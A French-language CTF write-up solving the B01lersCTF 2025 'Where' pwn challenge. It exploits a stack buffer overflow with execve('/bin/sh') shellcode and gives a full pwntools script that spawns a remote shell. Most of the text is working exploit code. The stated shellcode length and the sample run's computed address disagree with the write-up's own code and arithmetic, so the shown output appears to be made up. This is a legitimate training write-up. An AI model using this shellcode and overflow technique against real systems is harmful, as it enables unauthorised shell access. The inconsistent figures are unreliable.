---
title: "B01lersCTF 2025 : Where | Pwn"
date: 2025-04-22
draft: false
categories: ["Pwn"]
ctf: "B01lersCTF 2025"
challenge: "Where"
author: "Reyko"
---


# Challenge : where

### Énoncé 

> WHERE should the Little Einsteins go on their next adventure?


**Fichiers fournis :**
- `chal` : binaire ELF 64‑bits LSB, x86‑64, non PIE, NX désactivé, pile exécutable.
- `flag.txt` : présent sur le serveur (le fichier local contient un faux flag).

### 1. Analyse statique

```bash
$ file chal
chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), not stripped
$ checksec --file=chal
    Arch:      amd64-64-little
    NX:        disabled
    PIE:       No PIE
    Canary:    absent
    RWX:       Has RWX segments
````

- Le binaire n’a pas de **NX** (pile exécutable) et n’est pas en **PIE** (adresses de code fixes).

- Dans `main`, on repère deux buffers sur la pile :

    ```c
    char local_30[8];        // buffer de 8 octets
    char local_28[32];       // buffer de 32 octets
    ```

- Le code exécute ensuite :

    ```c
    setup();
    puts("I have put a ramjet on the little einstein's rocket ship");
    puts("However, I do not know WHERE to go on the next adventure!");
    printf("Quincy says somewhere around here might be fun... %p\n", local_30);
    fgets(local_28, 0x30, stdin);
    return 0;
    ```

- La lecture `fgets(local_28, 0x30, stdin)` est vulnérable : elle peut lire jusqu’à 47 octets utiles dans un buffer de 32 octets, suivi d’un `\0`.

    - **32 octets** → `local_28`

    - **+ 8 octets** → saved RBP

    - **+ 7 octets** → début de saved RIP (8ᵉ octet de RIP reste 0x00 en little‑endian)


### 2. Fuite d’adresse

Le programme affiche l’adresse de `local_30` via :

```c
printf("Quincy says somewhere around here might be fun... %p\n", local_30);
```

Exemple de sortie :

```
Quincy says somewhere around here might be fun... 0x7ffd1234abcd
```

- **addr_leak** = 0x7ffd1234abcd (adresse de `local_30`)
    
- Le buffer `local_28` se trouve **8 octets** plus haut sur la pile :

```
addr_shellcode = addr_leak + 0x08
```


### 3. Shellcode

Pour tenir dans les **32 octets** de `local_28`, on écrit un shellcode de **28 bytes** :

```asm
; xor rax,rax
48 31 c0
; xor rsi,rsi
48 31 f6
; movabs rbx, 0x0068732f6e69622f   ; "/bin/sh\0"
48 bb 2f 62 69 6e 2f 73 68 00
; push rbx                         ; empile "/bin/sh\0"
53
; mov rdi, rsp                     ; rdi → "/bin/sh"
48 89 e7
; xor rdx, rdx                     ; rdx = 0
48 31 d2
; mov al,0x3b                      ; syscall execve
b0 3b
; syscall                          ; appel système
0f 05
```

En Python/Pwntools :

```python
sc  =  b"\x48\x31\xc0"                             # xor rax,rax
sc += b"\x48\x31\xf6"                             # xor rsi,rsi
sc += b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" # movabs rbx,"/bin/sh\0"
sc += b"\x53"                                     # push rbx
sc += b"\x48\x89\xe7"                             # mov rdi,rsp
sc += b"\x48\x31\xd2"                             # xor rdx,rdx
sc += b"\xb0\x3b"                                 # mov al,0x3b
sc += b"\x0f\x05"                                 # syscall
assert len(sc) <= 32
```

---

### 4. Construction du payload

1. **Shellcode** (≤ 32 bytes)
   
2. **NOP‑sled** (`0x90`) pour remplir jusqu’à 32 bytes :

```python
b"\x90" * (32 - len(sc))
```

3. **8 octets** de padding pour écraser saved RBP : `b"A" * 8`

4. **7 octets** pour écraser saved RIP :

```python
 p64(addr_shellcode)[:7]
```

(le 8ᵉ octet reste 0x00 en little‑endian)


5. **Total** : `32 + 8 + 7 = 47` bytes envoyés, puis `fgets` écrit un `\0` en 48ᵉ position.

### 5. Solve

solve.py : 

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

# Connexion SSL
p = remote('where.harkonnen.b01lersc.tf', 8443, ssl=True)

# 1) On lit jusqu'à "fun... " et on extrait le leak
p.recvuntil(b'fun... ')
leak = int(p.recvline().strip(), 16)
log.info(f"stack leak = {hex(leak)}")

# 2) Calcul de l'adresse de shellcode
addr_shell = leak + 8
log.info(f"shellcode @ {hex(addr_shell)}")

# 3) Shellcode minimal sc  
sc  =  b"\x48\x31\xc0"
sc += b"\x48\x31\xf6"
sc += b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
sc += b"\x53"
sc += b"\x48\x89\xe7"
sc += b"\x48\x31\xd2"
sc += b"\xb0\x3b"
sc += b"\x0f\x05"
assert len(sc) <= 32

# 4) Construction du payload
payload  = sc
payload += b"\x90" * (32 - len(sc))   # NOP‑sled
payload += b"A" * 8                     # saved RBP
payload += p64(addr_shell)[:7]           # saved RIP (7 octets)

# 5) Envoi brut et passage en mode interactif
p.send(payload)
p.interactive()
```

---

### 6. Flag

```bash
$ python3 solve.py
[*] Opening connection to where.harkonnen.b01lersc.tf on port 8443
[*] stack leak = 0x7ffd1234abcd
[*] shellcode @ 0x7ffd1234abe5
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
bctf{where_in_the_universe_are_they_6ba1f9d3}
```
